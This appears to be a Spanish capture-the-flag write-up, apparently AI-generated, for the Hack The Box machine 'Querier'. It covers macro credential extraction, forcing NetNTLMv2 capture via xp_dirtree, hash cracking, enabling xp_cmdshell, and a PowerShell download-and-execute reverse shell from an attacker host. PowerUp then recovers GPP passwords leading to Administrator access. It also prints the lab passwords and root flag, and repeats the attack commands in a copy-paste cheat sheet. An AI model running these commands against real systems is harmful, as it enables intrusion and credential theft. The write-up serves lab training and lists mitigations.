
## Recon / Enumeración inicial

Escaneo nmap enfocado en RPC/SMB/MSSQL/WinRM:

```bash
nmap -sCV -p135,139,445,1433,5985,47001,49664-49671 10.129.21.159
```

Resultados relevantes:

* `135,139,445` → SMB / RPC disponibles
* `1433` → Microsoft SQL Server 2017
* `5985,47001` → WinRM (HTTP)
* SMB: `message signing enabled but not required` (permitía técnicas de captura/relay en laboratorio)

---

## Descarga y análisis del `.xlsm`

Encontramos un archivo en el share `Reports`:

```
Currency Volume Report.xlsm
```

Descarga y análisis seguro (sin abrir en Excel):

```bash
smbclient -m SMB2 //<TARGET>/Reports -N -c 'get "Currency Volume Report.xlsm"'
olevba "Currency Volume Report.xlsm" > macros.txt
```

**Hallazgo:** el macro contenía credenciales claras:

```
reporting:PcwTWTHRwryjc$c6
```

---

## Validación de credenciales y SMB

Probamos la credencial encontrada contra SMB/WinRM/MSSQL:

```bash
crackmapexec smb <TARGET> -u reporting -p 'PcwTWTHRwryjc$c6' --shares
```

Resultado: autenticación SMB exitosa como `WORKGROUP\reporting`. Con esto pudimos listar/downloadear archivos del share `Reports`.

---

## Captura de NetNTLMv2 y cracking

### Preparar servidor SMB que capture NTLM

En la máquina atacante (bind en IP que la víctima puede alcanzar, ej. `10.10.15.124`):

```bash
sudo python3 smbserver.py smbFolder $(pwd) -smb2support
```

### Forzar a la víctima a autenticarse contra nuestro SMB

En el prompt SQL (uso de `xp_dirtree` para provocar la conexión):

```sql
EXEC master..xp_dirtree '\\\\10.10.15.124\\smbFolder';
```

En `smbserver.py` se capturó la línea NetNTLMv2 parecida a:

```
mssql-svc::QUERIER:4141414141414141:4ac8254c22...:01010000...
```

Se guarda esa línea en `captured.hash`.

### Cracking (John/Hashcat)

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt --format=netntlmv2 captured.hash
# o con hashcat (GPU)
hashcat -m 5600 captured.hash rockyou.txt
```

Resultado: `mssql-svc:corporate568`

---

## Uso de `mssql-svc` y `xp_cmdshell`

Con `mssql-svc:corporate568` nos autenticamos en MSSQL (Windows auth):

```bash
mssqlclient.py 'WORKGROUP/mssql-svc:corporate568@<TARGET>' -windows-auth
```

Dentro del prompt SQL:

```sql
sp_configure 'show advanced options', 1; RECONFIGURE;
sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';
EXEC xp_cmdshell 'ipconfig';
```

`xp_cmdshell` devolvió:

```
querier\mssql-svc
IPv4 Address : 10.129.32.26
```

---

## Reverse shell y enumeración desde el host

1. Servimos un script PowerShell (`PS.ps1`) desde atacante:

```bash
sudo python3 -m http.server 80 --bind 10.10.15.124
```

2. Ejecutamos desde SQL (con escape correcto):

```sql
EXEC xp_cmdshell 'powershell -NoP -NonI -W Hidden -Exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString(''http://10.10.15.124/PS.ps1'')"';
```

3. En atacante, escucha con `nc`:

```bash
sudo rlwrap nc -lvnp 443
```

Recibimos reverse shell como `querier\mssql-svc`.

### Enumeración (desde la shell)

Comandos rápidos ejecutados:

```powershell
whoami /priv
Get-WmiObject Win32_Service | Select Name,StartName,PathName
Get-ChildItem -Path C:\Users -Recurse -Include *.bak,*.rdp,*.config,*.ps1 -ErrorAction SilentlyContinue
```

**Observación crítica:** `whoami /priv` mostró `SeImpersonatePrivilege` **Enabled** → apto para Juicy/RottenPotato tipo EoP, pero preferimos un análisis automático primero.

---

## PowerUp / escalado a Administrator

Se descargó y ejecutó PowerUp (PowerSploit) modificado para lanzar `Invoke-AllChecks`:

```powershell
IEX (New-Object Net.WebClient).DownloadString('http://10.10.15.124/PowerUp.ps1')
Invoke-AllChecks
```

**Resultado crítico (GPP Cached files):**

* Archivo:
  `C:\ProgramData\Microsoft\Group Policy\History\{...}\Machine\Preferences\Groups\Groups.xml`
* Dentro: contraseña en claro del **Administrator**:

  ```
  Passwords : {MyUnclesAreMarioAndLuigi!!1!}
  ```

> GPP stored passwords: técnica conocida donde la GPP XML contenía contraseñas en texto plano (legacy). Encontrado por PowerUp.

---

## Obtener `root.txt` como Administrator

Con la contraseña recuperada se probó acceso por WinRM y SMB:

### Probar WinRM (evil-winrm)

```bash
evil-winrm -i <TARGET> -u Administrator -p 'MyUnclesAreMarioAndLuigi!!1!'
```

Resultado: conexión exitosa como `Administrator`.

### Leer root.txt

Dentro de la sesión Administrator:

```powershell
cd C:\Users\Administrator\Desktop
type root.txt
# -> 788e56b4c8c1f08a897fc57125cea03c
```

`root.txt` obtenido con éxito.

---

## Mitigaciones recomendadas

1. **No almacenar contraseñas en GPP** — usar LAPS, Managed Service Accounts o secretos centralizados; eliminar GPP passwords.
2. **Deshabilitar macros por defecto** y usar políticas de whitelisting/EDR para scripts.
3. **Eliminar credenciales embebidas** en ficheros (apps, macros).
4. **Deshabilitar `xp_cmdshell` si no es necesaria** y auditar su uso.
5. **Habilitar SMB signing de forma obligatoria** para evitar capturas/relays NTLM.
6. **Segmentación de red**: minimizar la exposición entre hosts y limitar qué servidores pueden realizar conexiones salientes no controladas.
7. **Registro y alertas** para cambios de políticas, habilitación de opciones avanzadas y ejecuciones de `xp_cmdshell`.
8. **Rotación de contraseñas** y políticas de complejidad / almacenamiento seguro.

---

## Comandos útiles (colección rápida)

### Recon / enumeration

```bash
nmap -sCV -p135,139,445,1433,5985,47001,49664-49671 <TARGET>
smbclient -L //<TARGET> -N
smbclient -m SMB2 //<TARGET>/Reports -N -c 'get "Currency Volume Report.xlsm"'
olevba "Currency Volume Report.xlsm"
```

### SMB server y captura NTLM

```bash
sudo python3 smbserver.py smbFolder $(pwd) -smb2support
# en la víctima:
EXEC master..xp_dirtree '\\\\<ATTACKER_IP>\\smbFolder';
```

### Cracking NetNTLMv2

```bash
# guardar la línea capturada en captured.hash
john --wordlist=/usr/share/wordlists/rockyou.txt --format=netntlmv2 captured.hash
# o hashcat -m 5600 captured.hash rockyou.txt
```

### MSSQL / xp_cmdshell

```bash
mssqlclient.py 'WORKGROUP/mssql-svc:corporate568@<TARGET>' -windows-auth
sp_configure 'show advanced options', 1; RECONFIGURE;
sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEC xp_cmdshell 'powershell -NoP -NonI -W Hidden -Exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString(''http://<ATTACKER_IP>/PS.ps1'')"';
```

### Reverse shell listener

```bash
sudo rlwrap nc -lvnp 443
```

### Post-exploitation (enumeración y PowerUp)

```powershell
IEX (New-Object Net.WebClient).DownloadString('http://<ATTACKER_IP>/PowerUp.ps1')
Invoke-AllChecks
```

### Administrador (final)

```bash
evil-winrm -i <TARGET> -u Administrator -p 'MyUnclesAreMarioAndLuigi!!1!'
# o smbclient
smbclient -m SMB2 //<TARGET>/C$ -U 'Administrator'%'MyUnclesAreMarioAndLuigi!!1!' -c 'get "Users\Administrator\Desktop\root.txt"'
```

---

## Timeline condensado (cadena de eventos)

1. nmap → SMB, MSSQL, WinRM detectados.
2. Encontrado `.xlsm` en `Reports`.
3. Macro → `reporting` creds.
4. SMB auth como `reporting` → más enumeración.
5. Forzado `xp_dirtree` → capture NetNTLMv2 de `mssql-svc`.
6. Cracked NetNTLMv2 → `mssql-svc:corporate568`.
7. Con `mssql-svc` habilitado `xp_cmdshell` → ejecutado PowerShell → reverse shell.
8. Ejecutado PowerUp → recuperada contraseña Admin desde GPP XML.
9. WinRM con Administrator → lectura de `root.txt`.

---

## Notas finales

* Este writeup está escrito para **uso en laboratorio autorizado** (HTB). Nunca apliques estas técnicas en sistemas sin permiso.
* Si querés, te convierto esto en un **README.md** o te lo exporto a PDF. También puedo generarte una versión corta (1 página) para entregar en un informe.
* Si querés que incluya fragmentos exactos de logs (salidas nmap, smbserver, captura de hash, comandos y outputs) puedo insertarlos en el Markdown — pegá aquí los outputs que quieras que incluya.

---

*Fin del writeup.*
